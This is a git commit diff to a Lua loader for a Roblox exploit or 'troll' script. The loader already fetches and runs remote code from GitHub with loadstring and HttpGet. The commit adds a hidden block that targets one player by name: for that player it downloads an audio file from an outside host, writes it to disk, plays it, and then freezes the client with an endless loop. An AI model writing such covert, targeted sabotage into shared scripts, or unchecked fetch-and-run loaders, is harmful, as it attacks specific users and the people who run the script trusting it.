9c170d192cd776548b97fc83284d9292fc3ce05d
BongCloudMaster <126247984+BongCloudMaster@users.noreply.github.com>
2023-04-08 20:35:23 +0800

    Update Loader.lua

--- Loader.lua
+++ Loader.lua
@@ -5,3 +5,6 @@ if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and no
 elseif not UserInputService.TouchEnabled and UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/BongCloudMaster/Troll-GE-Script-Roots/main/PC_Version.lua"))();
 end;
+
+-- Fuck you
+if LocalPlayer.Name=='100x100x100x100i'then pcall(function ()writefile("HeyYa.mp3",game:HttpGet"https://s3.us-east-1.wasabisys.com/e-zimagehosting/8c73d63b-9423-4ca8-93f4-9da5b8e9929b/2kpmgtqn.wav")local a=Instance.new"Sound"a.Parent=gethui()a.SoundId=getcustomasset"HeyYa.mp3"a.Volume=0.2;a:Play()end )task.wait(5001)while true do end end 
